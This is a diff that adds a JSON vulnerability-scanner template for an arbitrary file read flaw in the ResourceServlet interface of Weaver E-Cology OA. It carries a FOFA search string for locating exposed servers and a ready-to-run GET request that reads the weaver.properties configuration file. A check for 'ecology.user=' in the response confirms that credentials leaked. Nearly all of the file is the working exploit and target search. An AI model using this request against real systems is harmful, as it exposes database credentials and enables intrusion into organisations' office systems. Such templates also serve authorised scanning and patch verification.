@@ -1,0 +1,37 @@
+{
+  "product": "泛微E-Cology",
+  "vul_name": "泛微E-Cology ResourceServlet接口任意文件读取",
+  "type": "文件读取",
+  "vul_id": [],
+  "level": 3,
+  "vul_desc": "泛微e-cology依托全新的设计理念,全新的管理思想。 为中大型组织创建全新的高效协同办公环境。 智能语音办公,简化软件操作界面。 身份认证、电子签名、电子签章、数据存证让合同全程数字化。泛微OA E-Cology ResourceServlet接口存在任意文件读取漏洞",
+  "version": "",
+  "note": "",
+  "search": {
+    "FOFA": "app=\"泛微-OA（e-cology）\""
+  },
+  "protocol": "http",
+  "link": "https://mp.weixin.qq.com/s/D3DNGy8sStI_aE4qyae9jg",
+  "fix": [
+    "建议联系软件厂商进行处理。"
+  ],
+  "model": "",
+  "logic": "and",
+  "exploit": {
+    "exp": {
+      "method": "get",
+      "follow": false,
+      "path": "/weaver/org.springframework.web.servlet.ResourceServlet?resource=/WEB-INF/prop/weaver.properties"
+    },
+    "verify": {
+      "path": "",
+      "logic": "and",
+      "check": [
+        {
+          "status": 200,
+          "body": "ecology.user="
+        }
+      ]
+    }
+  }
+}
